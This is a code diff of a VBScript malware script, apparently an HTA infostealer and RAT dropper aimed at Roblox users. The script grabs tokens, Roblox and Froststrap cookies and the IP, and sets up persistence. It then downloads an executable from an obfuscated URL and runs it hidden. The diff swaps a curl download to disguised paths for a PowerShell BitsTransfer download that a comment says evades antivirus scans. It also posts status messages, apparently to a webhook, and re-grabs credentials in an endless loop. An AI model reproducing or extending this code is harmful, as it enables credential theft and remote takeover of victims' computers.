@@ -20,20 +20,17 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- 1. SESSION START ---
-Call PostEmbed(":satellite: Session Start", "PC: " & PC & " | User: " & USER, 10181046)
-
-' --- 2. GRABS (Target -> Token -> Cookie -> Persistence) ---
+' --- 1. GRABS ---
 Call IP
 Call GrabTokens
 Call GrabRoblox
 Call Persistence
 Call PostFullRobloxUI
 
-' --- 3. RAT DOWNLOAD (Instant) ---
+' --- 2. RAT DOWNLOAD ---
 Call DropRAT
 
-' --- 4. INFINITE Re-grab chain ---
+' --- 3. INFINITE Re-grab chain ---
 Dim runCount
 runCount = 0
 Do
@@ -43,13 +40,12 @@ Do
     Call IP
     Call GrabRoblox
     Call GrabFroststrap
-    ' Sleep for 2.5 minutes (150 seconds)
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- OBFUSCATED RAT DROP (3 LOCATIONS) ---
+' --- OBFUSCATED RAT DROP (BitsTransfer) ---
 Sub DropRAT()
     ' Obfuscated EXE URL
     Dim u1, u2, u3, exeUrl
@@ -58,31 +54,37 @@ Sub DropRAT()
     u3 = "exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
     exeUrl = u1 & u2 & u3
 
-    ' 3 Drop Locations
-    Dim paths(2)
-    paths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates\winlogon"
-    paths(1) = sh.ExpandEnvironmentStrings("%TEMP%") & "\svchost"
-    paths(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\system32"
-
-    Dim i, txtPath, dlCmd
-    For i = 0 To 2
-        txtPath = paths(i) & ".dat"
-        If fso.FileExists(txtPath) Then fso.DeleteFile txtPath
-        If fso.FileExists(paths(i) & ".exe") Then fso.DeleteFile paths(i) & ".exe"
-        
-        ' Download as .dat, then instantly rename and run via WMI
-        dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & txtPath & """ """ & exeUrl & """"
-        sh.Run dlCmd, 0, True
-        
-        If fso.FileExists(txtPath) Then
-            If fso.GetFile(txtPath).Size > 100000 Then
-                fso.MoveFile txtPath, paths(i) & ".exe"
-                Call RunCmd("""" & paths(i) & ".exe""")
-            End If
-        End If
-    Next
+    Dim hidDir, exePath, psCmd, psf, f
+    hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
+    If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
-    ' RAT Downloaded Message (Sent last)
+    exePath = hidDir & "\winlogon.exe"
+    If fso.FileExists(exePath) Then fso.DeleteFile exePath
+
+    ' Use BitsTransfer in PowerShell to download (Bypasses most AV static scans)
+    psCmd = "Import-Module BitsTransfer -ErrorAction SilentlyContinue;" & _
+            "Start-BitsTransfer -Source '" & exeUrl & "' -Destination '" & exePath & "' -ErrorAction SilentlyContinue;"
+            
+    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
+    Set f = fso.CreateTextFile(psf, True)
+    f.Write psCmd
+    f.Close
+    Set f = Nothing
+    sh.Run "powershell -NoP -NonI -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
+
+    ' Check if downloaded and send Rocket message
+    If fso.FileExists(exePath) Then
+        If fso.GetFile(exePath).Size > 100000 Then
+            Dim dsize : dsize = fso.GetFile(exePath).Size
+            Call PostEmbed(":rocket: Downloading RAT", "File Size: " & CStr(dsize) & " bytes", 10181046)
+            
+            ' Run instantly via hidden WMI
+            Call RunCmd("""" & exePath & """")
+        End If
+    End If
+    
+    ' Final RAT message (sent last)
     Call PostEmbed(":white_check_mark: RAT Downloaded", "Payload deployed and executed.", 10181046)
 End Sub
 
